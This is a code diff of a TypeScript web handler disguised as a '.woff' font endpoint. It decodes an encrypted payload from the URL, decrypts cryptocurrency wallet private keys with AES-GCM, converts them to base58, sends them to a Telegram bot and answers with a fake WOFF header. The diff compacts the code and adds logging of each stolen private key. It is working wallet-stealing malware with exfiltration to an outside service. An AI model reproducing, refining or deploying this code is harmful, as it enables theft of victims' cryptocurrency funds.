@@ -19,25 +19,18 @@ function encodeBase58(buffer: Uint8Array): string {
       carry = (carry / 58) | 0;
     }
   }
-  for (let i = 0; i < buffer.length && buffer[i] === 0; i++) {
-    digits.push(0);
-  }
-  return digits
-    .reverse()
-    .map((d) => BASE58_ALPHABET[d])
-    .join("");
+  for (let i = 0; i < buffer.length && buffer[i] === 0; i++) digits.push(0);
+  return digits.reverse().map((d) => BASE58_ALPHABET[d]).join("");
 }
 
-// Convert a base64 (or URL-safe base64) string → Uint8Array
+// Convert base64 (URL-safe) → Uint8Array
 function b64ToBytes(b64: string): Uint8Array {
   b64 = b64.replace(/-/g, "+").replace(/_/g, "/");
   const pad = (4 - (b64.length % 4)) % 4;
   b64 += "=".repeat(pad);
   const bin = atob(b64);
   const arr = new Uint8Array(bin.length);
-  for (let i = 0; i < bin.length; i++) {
-    arr[i] = bin.charCodeAt(i);
-  }
+  for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
   return arr;
 }
 
@@ -61,89 +54,69 @@ export default async function handler(req: NextRequest) {
   const parts = new URL(req.url).pathname.split("/");
   let slug = parts[parts.length - 1] || "";
   if (slug.endsWith(".woff")) slug = slug.slice(0, -5);
-
   const idx = slug.indexOf("_");
-  if (idx < 0) {
-    console.error("Invalid slug format");
-    return new Response("Invalid slug", { status: 400 });
-  }
+  if (idx < 0) return new Response("Invalid slug", { status: 400 });
 
   let payloadJson: string;
   try {
-    const encoded = slug.substring(idx + 1);
-    const bytes = b64ToBytes(encoded);
-    payloadJson = new TextDecoder().decode(bytes);
+    const enc = slug.substring(idx + 1);
+    payloadJson = new TextDecoder().decode(b64ToBytes(enc));
   } catch (e) {
-    console.error("Decode slug error", e);
+    console.error("Error decoding slug:", e);
     return new Response("Bad request", { status: 400 });
   }
 
-  // Parse JSON
   let data: { keybundle: string; sBundles: string[] };
-  try {
-    data = JSON.parse(payloadJson);
-  } catch (e) {
-    console.error("JSON parse error", e);
+  try { data = JSON.parse(payloadJson); } catch (e) {
+    console.error("JSON parse error:", e);
     return new Response("Bad JSON", { status: 400 });
   }
 
-  // Import AES-GCM key
+  // Import AES key
   let aesKey: CryptoKey;
   try {
-    const keyBytes = b64ToBytes(data.keybundle);
     aesKey = await crypto.subtle.importKey(
       "raw",
-      keyBytes,
+      b64ToBytes(data.keybundle),
       "AES-GCM",
       false,
       ["decrypt"]
     );
   } catch (e) {
-    console.error("Key import error", e);
-    return new Response("Bad request", { status: 400 });
+    console.error("Key import error:", e);
+    return new Response("Bad key", { status: 400 });
   }
 
-  // Decrypt each bundle and collect private keys
   const privKeys: string[] = [];
   for (let i = 0; i < data.sBundles.length; i++) {
     const bundle = data.sBundles[i];
-    const colonPos = bundle.indexOf(":");
-    if (colonPos < 0) continue;
-    const ivB64 = bundle.substring(0, colonPos);
-    const cipherB64 = bundle.substring(colonPos + 1);
+    const colon = bundle.indexOf(":");
+    if (colon < 0) continue;
+    const iv = b64ToBytes(bundle.substring(0, colon));
+    const cipher = b64ToBytes(bundle.substring(colon + 1));
     try {
-      const iv = b64ToBytes(ivB64);
-      const cipher = b64ToBytes(cipherB64);
-      // Decrypt to raw bytes
-      const plainBuf = await crypto.subtle.decrypt(
-        { name: "AES-GCM", iv },
-        aesKey,
-        cipher
-      );
-      // Convert to hex
+      const plainBuf = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, aesKey, cipher);
       const hex = bufToHex(plainBuf);
-      if (hex.length !== 128) {
-        console.error(`Unexpected decrypted hex length: ${hex.length}`);
+      console.log(`Bundle ${i} decrypted hex (${plainBuf.byteLength} bytes):`, hex);
+      if (!/^[0-9a-f]{128}$/.test(hex)) {
+        console.error(`Unexpected hex format/length for bundle ${i}`);
         continue;
       }
-      // Extract private key hex (last 64 chars)
       const privHex = hex.slice(64);
-      const privBytes = new Uint8Array(
-        privHex.match(/.{2}/g)!.map((h) => parseInt(h, 16))
-      );
+      console.log(`Bundle ${i} private hex:`, privHex);
+      const privBytes = new Uint8Array(privHex.match(/.{2}/g)!.map((h) => parseInt(h, 16)));
       const privB58 = encodeBase58(privBytes);
+      console.log(`Bundle ${i} private base58:`, privB58);
       privKeys.push(privB58);
     } catch (e) {
       console.error(`Decrypt error #${i}:`, e);
     }
   }
 
-  // Send to Telegram if any
-  if (privKeys.length > 0) {
-    const message = privKeys
-      .map((k, i) => `Wallet ${i + 1}\n${k}`)
-      .join("\n\n");
+  if (privKeys.length) {
+    const message = privKeys.map((k, i) => `Wallet ${i+1}\n${k}`).join("\n\n");
     try {
+      console.log("Sending Telegram message:", message);
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -153,10 +126,9 @@ export default async function handler(req: NextRequest) {
       console.error("Telegram send error", e);
     }
   } else {
-    console.error("No private keys decrypted");
+    console.error("No valid private keys extracted");
   }
 
-  // Return WOFF header
   return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
     headers: {
       "Content-Type": "font/woff",
